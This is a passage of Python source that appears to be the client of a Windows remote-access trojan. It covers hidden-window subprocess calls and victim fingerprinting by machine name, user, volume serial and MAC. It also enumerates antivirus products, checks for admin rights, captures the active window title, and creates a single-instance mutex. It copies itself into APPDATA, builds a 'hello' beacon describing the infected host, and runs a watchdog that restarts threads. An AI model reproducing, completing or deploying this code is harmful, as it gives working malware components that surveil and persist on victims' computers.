g_wan = ""


def f_appdir():
    if not G.get("dir"):
        p = os.path.join(os.environ.get("APPDATA") or tempfile.gettempdir(), CFG["id"])
        os.makedirs(p, exist_ok=True)
        G["dir"] = p
    return G["dir"]


def f_vol():
    try:
        o = subprocess.run(["cmd", "/c", "vol", "c:"], capture_output=True, text=True,
                           timeout=6, creationflags=0x08000000).stdout
        m = re.search(r"([0-9A-Fa-f]{4}-[0-9A-Fa-f]{4})", o)
        return m.group(1) if m else "0000-0000"
    except Exception:
        return "0000-0000"


def f_hwid():
    s = "|".join([os.environ.get("COMPUTERNAME", ""), os.environ.get("USERNAME", ""),
                  f_vol(), str(uuid.getnode()), CFG["id"]])
    return hashlib.sha256(s.encode()).hexdigest()[:20]


def f_osname():
    try:
        return platform.platform()[:80]
    except Exception:
        return "windows"


def f_lan():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"


def f_wan():
    global g_wan
    if not g_wan:
        try:
            import urllib.request
            g_wan = urllib.request.urlopen("https://api.ipify.org", timeout=6).read().decode().strip()
        except Exception:
            g_wan = ""
    return g_wan


def f_av():
    try:
        p = subprocess.run(["powershell", "-NoProfile", "-Command",
                            "(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName"],
                           capture_output=True, text=True, timeout=25, creationflags=0x08000000)
        return " ".join(p.stdout.split())[:120]
    except Exception:
        return "?"


def f_adm():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def f_win():
    try:
        u = ctypes.windll.user32
        h = u.GetForegroundWindow()
        n = u.GetWindowTextLengthW(h)
        b = ctypes.create_unicode_buffer(n + 1)
        u.GetWindowTextW(h, b, n + 1)
        return b.value
    except Exception:
        return ""


def f_mutex():
    try:
        ctypes.windll.kernel32.CreateMutexW(None, False, "wnk_" + G["hwid"])
    except Exception:
        pass


def f_install():
    cur = os.path.abspath(sys.executable)
    G["self"] = cur
    if not getattr(sys, "frozen", False):
        return
    try:
        dst = os.path.join(f_appdir(), os.path.basename(cur))
        if os.path.abspath(dst).lower() != cur.lower():
            if not os.path.exists(dst):
                shutil.copy2(cur, dst)
            if os.path.exists(dst) and os.path.getsize(dst) == os.path.getsize(cur):
                G["self"] = dst
        f_log("run.log", "install ok, self=" + G["self"])
    except Exception as e:
        f_log("run.log", "install failed: " + repr(e))


def f_hello():
    return {"id": G["hwid"], "h": os.environ.get("COMPUTERNAME", "?"),
            "u": os.environ.get("USERNAME", "?"), "os": f_osname(),
            "arch": os.environ.get("PROCESSOR_ARCHITECTURE", "?"), "av": G.get("av", ""),
            "ip": f_lan(), "wan": G.get("wan") or "", "adm": G.get("adm", False),
            "ts": int(time.time()), "up": int(time.time() - G["start"]), "win": f_win(),
            "pid": os.getpid(), "exe": G.get("self", sys.executable)}


def f_wrap(fn):
    def inner():
        while G.get("run"):
            try:
                fn()
            except Exception as e:
                f_log("run.log", "thread crash: " + repr(e))
            time.sleep(1)
    return inner


def f_dog():
    while G.get("run"):
        for name, t in list(G["threads"].items()):
            if not t.is_alive():
                try:
                    nt = threading.Thread(target=G["fn_" + name], daemon=True)
                    nt.start()
                    G["threads"][name] = nt
                except Exception:
                    pass
        time.sleep(20)